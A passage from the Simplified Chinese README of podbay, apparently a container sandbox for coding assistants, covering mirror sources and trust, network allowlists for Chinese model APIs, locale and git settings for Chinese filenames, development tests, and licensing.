预置命令访问的下载地址都由你的 profile 决定，可以换成国内的镜像源。以 `rust.toml` 为例，rustup 支持
`RUSTUP_DIST_SERVER` 和 `RUSTUP_UPDATE_ROOT`，写在 profile 的 `[env]` 里，预置容器和会话都会得到它们：

```toml
[env]
RUSTUP_DIST_SERVER = "https://<rustup 镜像源>"
RUSTUP_UPDATE_ROOT = "https://<rustup 镜像源>/rustup"
```

需要注意信任的转移：

- 示例中的 `rustup-init` 下载后会与 profile 中写死的 SHA-256 核对，所以把它的下载地址换成镜像源是安全的，只要校验和不变。
- rustup 通过镜像源安装的工具链，只与该镜像源自己提供的清单核对。换用镜像源意味着信任它，就像你在宿主机上换用它一样。
- 会话里如果要访问 crates.io、PyPI、npm 等的镜像源，请把镜像源的主机名加进 `network` 允许列表，并按各工具自己的方式配置镜像源。

### 国内模型服务

编程助手常用的国内模型服务也可以放进允许列表，例如：

```toml
# ~/.config/podbay/profiles/deepseek.toml
env_from_host = ["DEEPSEEK_API_KEY"]
network = ["api.deepseek.com"]
```

其他服务的 API 主机名请以服务商文档为准（例如月之暗面、智谱、阿里云百炼）。与上文一样：会话能读到密钥，也能把它发往允许列表上的任何主机，所以列表里只放这个服务商。

### 中文文件名与中文输入

自带的基础镜像没有设置 locale，会话里默认是 `C`。要在 shell 里正常显示和输入中文，请在你的基础 profile 里设置：

```toml
[env]
LANG = "C.UTF-8"
```

git 默认把非 ASCII 的路径显示成八进制转义（如 `"\344\270\255"`）。项目的 `.git/config` 在会话中是只读的，所以请在挂载进去的
`~/.gitconfig` 里设置 `core.quotepath = false`，或者运行 `git -c core.quotepath=false status`。

项目目录名可以是中文。podbay 用目录名生成卷名等标识时只保留 ASCII 字母和数字，所以全中文的目录名会显示为 `repo-` 加一段哈希；这不影响使用。会话报告会原样显示中文路径，只转义控制字符和双向文字控制符。

### podbay 的输出是英文的

podbay 打印的消息都是英文，而且与英文 README 中的措辞一致。看到不熟悉的消息时，可以在本文的代码块或 [README.md](README.md)
里搜索原文，找到对应的说明。
<!-- /zh-only -->

<a id="development"></a>
## 开发

发布：在 `Cargo.toml` 中设置 `version`，提交，然后推送一个匹配的标签（`v0.2.0`）。发布工作流会检查标签是否匹配、运行测试、构建两个二进制文件并发布它们。

```
cargo test                          # unit, CLI and end-to-end tests
PODBAY_TEST_BACKEND=podman cargo test
```

端到端测试会在 Docker（或 `PODBAY_TEST_BACKEND` 指定的引擎）上运行真实容器；该引擎不可用时会被跳过，除非设置了
`PODBAY_TEST_REQUIRE_ENGINE`。CI 在 Docker 和 rootless Podman 上都运行它们。它们使用一个基础镜像的小型替身（`tests/fixtures/test-base`），带有相同的
dev 用户和一个记录预置过程所见内容的假安装程序，因此不需要构建完整的工具链。其中两个测试扮演恶意会话：一个检查会话报告能否发现它，另一个检查网络允许列表是否守得住。设置
`PODBAY_TEST_INTERNET=1` 还会检查允许的主机是否可达，CI 就是这样做的。

podbay 基于四个 crate（`libc`、`anyhow` 和 `toml` 解析器），加上它们引入的共八个。`tests/dependencies.rs`
列出了每一个及其确切版本，构建了任何其他东西时测试就会失败，所以新增依赖永远是一个经过审查的有意改动。

中继和 podbay-init 是各自独立的 crate，位于 `relay/` 和 `init/`，只使用标准库，因为镜像用普通的 `rustc` 构建它们。运行
`cargo test --workspace` 和 `cargo clippy --workspace` 可以把它们包括在内。

README.md 和 THREAT_MODEL.md 有简体中文译本（`README.zh-CN.md`、`THREAT_MODEL.zh-CN.md`）。每个译本都记录了它所译自的英文文件的
SHA-256，英文改动后，`tests/translations.rs` 会一直失败，直到译文跟上。它还检查译文中的代码块与英文版逐字相同、链接都能找到目标。

<a id="license"></a>
## 许可证

MIT；见 [LICENSE](LICENSE)。podbay 编译进去的 seccomp profile `src/seccomp/moby-default.json` 来自
Docker，采用 Apache License 2.0（[它的许可证](src/seccomp/LICENSE)），发布的下载包中包含这两份许可证。
